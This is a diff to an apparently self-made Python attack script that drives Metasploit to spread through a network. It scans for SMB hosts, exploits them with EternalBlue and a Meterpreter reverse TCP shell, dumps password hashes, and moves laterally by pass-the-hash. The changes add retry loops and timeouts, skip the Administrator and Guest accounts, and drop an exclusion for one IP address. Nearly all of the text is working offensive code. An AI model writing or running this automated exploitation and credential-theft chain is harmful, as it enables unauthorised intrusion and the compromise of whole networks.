@@ -71,7 +71,7 @@ def nmScan(ip):
     range = convertIpToRange(ip)
     nm = nmap.PortScanner()
     print("Starting nmap scan over range: " + range + "...")
-    nm.scan(hosts=range, arguments="-O -n -p445,139")
+    nm.scan(hosts=range, arguments="-O -n -p445")
     hosts = nm.all_hosts()
 	# For each running machine IP picked up by nmap
     for host in hosts:
@@ -98,13 +98,20 @@ def passTheHash(ip, localip, hashlist, client):
     payload['LHOST'] = localip
     # try each of the hashes until one works
     for data in hashlist:
+        if data[0] == 'Administrator' or data[0] == 'Guest':
+            continue
         exploit['SMBUser'] = data[0]
         exploit['SMBPass'] = data[2]
-        print('Trying ' + data[0] + " on " + ip + '...')
-        hashes = runExploit(client, exploit, payload)
-        if hashes != None:
-            print('Successfully accessed ' + ip)
-            return hashes
+        times = 1
+        while times <= 10:
+           print('Trying ' + data[0] + ' on ' + ip + '...')
+           hashes = runExploit(client, exploit, payload, 6)
+           if hashes != None:
+               print('Successfeully accessed ' + ip + ' in ' + str(times) + ' attempts')
+               return hashes
+           else:
+               times += 1
+
     return None
     
 def eternalBlue(ip, localip, client):
@@ -115,10 +122,10 @@ def eternalBlue(ip, localip, client):
     # Load the reverse_tcp shell payload
     payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
     payload['LHOST'] = localip
-    hashes = runExploit(client, exploit, payload)
+    hashes = runExploit(client, exploit, payload, 18)
     if hashes != None:
-        print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
-        return hashes
+        print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip))
+        return hashes 
     return None
 
 def maxId(keys):
@@ -127,17 +134,17 @@ def maxId(keys):
     else:
         return keys[len(keys) - 1] + 1
 
-def runExploit(client, exploit, payload):
+def runExploit(client, exploit, payload, timeout):
     # Exploit the host
     proc = exploit.execute(payload=payload)
     jobId = maxId(client.sessions.list.keys()) # add 1 because pymetasploit is horribly written
-    timeout = 50
     count = 0
     while(jobId not in client.sessions.list.keys() and count < timeout):
         time.sleep(1)
         count += 1
     if count >= timeout:
         return None
+    print('Time taken: ' + str(count))
     # Get the shell and run the hashdump
     shell = client.sessions.session(jobId)
     if shell == None:
@@ -180,27 +187,24 @@ def main():
     client = setupRPC()
     # Try to break into machines with eternal blue
     hashes = []
-    for i in range(len(targets)):
-        if targets[i].get('ip') == '10.202.208.23':
-            continue
-        hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
-        if hashData != None:
-            #targets.pop(i)
-            mergeList(hashes, hashData)
-            break
+
+    while len(hashes) == 0:
+        for i in reversed(range(len(targets))):
+            hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
+            if hashData != None:
+                del targets[i]
+                mergeList(hashes, hashData)
+                break
 
     if len(hashes) > 0:
         # Found access to network start spidering
         print('Starting hash passing...')
         for i in range(len(targets)):
-            if targets[i].get('ip') == '10.202.208.23':
-                continue
             newHashes = passTheHash(targets[i].get('ip'), args['localIp'], hashes, client)
             if newHashes != None:
                 print('Adding ' + str(len(newHashes)) + ' to the hash list')
                 mergeList(hashes, newHashes)
                 print(hashes)
-                targets.pop(i)
     else:
         print('Could not gain access to network... bye!')
 
